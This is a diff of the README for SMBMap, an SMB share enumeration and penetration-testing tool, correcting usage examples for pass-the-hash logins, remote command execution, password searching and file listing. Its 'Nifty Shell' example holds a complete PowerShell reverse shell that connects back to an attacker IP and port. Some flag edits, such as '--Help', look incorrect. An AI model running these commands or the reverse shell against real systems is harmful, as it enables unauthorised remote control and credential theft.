@@ -13,7 +13,7 @@ Apparently the latest Impacket requires PyASN.1:
 http://sourceforge.net/projects/pyasn1/
 
 ## Features:
-- Pass-the-hash Support
+- Pass-the-Hash Support
 - File upload/download/delete
 - Permission enumeration (writable share, meet Metasploit)
 - Remote Command Execution
@@ -25,11 +25,11 @@ http://sourceforge.net/projects/pyasn1/
 SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
 
 optional arguments:
-  -h, --help            show this help message and exit
+  -h, --Help            show this help message and exit
 
 Main arguments:
   -H HOST               IP of host
-  --host-file FILE      File containing a list of hosts
+  --Host-file FILE      File containing a list of hosts
   -u USERNAME           Username, if omitted null session assumed
   -p PASSWORD           Password or NTLM hash
   -s SHARE              Specify a share (default C$), ex 'C$'
@@ -80,12 +80,12 @@ Examples:
 
 $ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1
 $ python smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
-$ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -h 10.1.3.30 -x 'net group "Domain Admins" /domain'
+$ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group "Domain Admins" /domain'
 ```
 
 ## Default Output:
 ```
-$ cat smb-hosts.txt | python smbmap.py -u jsmith -p 'R33nisP!nckl3' -d ABC
+$  python smbmap.py --host-file smb-hosts.txt -u jsmith -p 'R33nisP!nckl3' -d ABC
 [+] Reading from stdin
 [+] Finding open SMB ports....
 [+] User SMB session establishd...
@@ -109,7 +109,7 @@ $ cat smb-hosts.txt | python smbmap.py -u jsmith -p 'R33nisP!nckl3' -d ABC
 ```
 ## Command execution:
 ```
-$ python smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -h 192.168.2.50
+$ python smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -H 192.168.2.50
 [+] Finding open SMB ports....
 [+] User SMB session establishd...
 [+] IP: 192.168.2.50:445        Name: unkown                                            
@@ -146,7 +146,7 @@ $ python smbmap.py -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\Users'
 ## File Content Searching:
 
 ```
-$ python smbmap.py -h 192.168.1.203 -u Administrator -p p00p1234! -F password --search-path 'C:\Users\wingus\AppData\Roaming'
+$ python smbmap.py -H 192.168.1.203 -u Administrator -p p00p1234! -F password --search-path 'C:\Users\wingus\AppData\Roaming'
 [!] Missing domain...defaulting to WORKGROUP
 [+] Finding open SMB ports....
 [+] User SMB session establishd...
@@ -165,7 +165,7 @@ C:\Users\wingus\AppData\Roaming\Mozilla\Firefox\Profiles\35msadwm.default\prefs.
 This feature was added to compliment the file content searching feature
 
 ```
-$ python smbmap.py -h 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L 
+$ python smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L 
 [!] Missing domain...defaulting to WORKGROUP
 [+] Finding open SMB ports....
 [+] User SMB session establishd...
@@ -178,7 +178,7 @@ $ python smbmap.py -h 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L
 ## Nifty Shell:
 Run Powershell Script on Victim SMB host (change the IP in the code to your IP addres, i.e where the shell connects back to)
 ```
-$ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -h 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 
+$ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 
 [+] Finding open SMB ports....
 [+] User SMB session establishd...
 [+] IP: 192.168.2.50:445        Name: unkown                                            
